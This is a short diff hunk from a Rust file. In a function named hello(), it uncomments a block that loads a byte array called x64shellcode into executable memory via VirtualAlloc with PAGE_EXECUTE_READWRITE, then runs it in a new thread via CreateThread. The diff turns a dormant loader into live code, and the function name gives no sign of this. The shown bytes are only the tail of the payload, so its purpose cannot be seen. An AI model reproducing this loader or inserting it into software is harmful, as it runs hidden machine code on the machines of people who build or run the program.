@@ -35,25 +35,25 @@ fn hello()  {
       0xcc, 0x48, 0x8b, 0xd6, 0xe9, 0x14, 0xff, 0xff, 0xff, 0x48, 0x03, 0xc3, 0x48, 0x83, 0xc4, 0x28,
       0xc3];
 
-    // unsafe {
-    //     let func_addr = VirtualAlloc(
-    //         null_mut(),
-    //         x64shellcode.len(),
-    //         MEM_COMMIT|MEM_RESERVE,
-    //         PAGE_EXECUTE_READWRITE,
-    //     );
-    //     std::ptr::copy_nonoverlapping(x64shellcode.as_ptr(), func_addr as *mut u8, x64shellcode.len());
+    unsafe {
+        let func_addr = VirtualAlloc(
+            null_mut(),
+            x64shellcode.len(),
+            MEM_COMMIT|MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE,
+        );
+        std::ptr::copy_nonoverlapping(x64shellcode.as_ptr(), func_addr as *mut u8, x64shellcode.len());
 
-    //     let mut thread_id: u32 = 0;
-    //     let _h_thread = CreateThread(
-    //         null_mut(),
-    //         0,
-    //         Some(std::mem::transmute(func_addr)),
-    //         null_mut(),
-    //         0,
-    //         &mut thread_id as *mut u32,
-    //     );
+        let mut thread_id: u32 = 0;
+        let _h_thread = CreateThread(
+            null_mut(),
+            0,
+            Some(std::mem::transmute(func_addr)),
+            null_mut(),
+            0,
+            &mut thread_id as *mut u32,
+        );
 
         // WaitForSingleObject(h_thread, 0xFFFFFFFF);
-    // }
+    }
 }
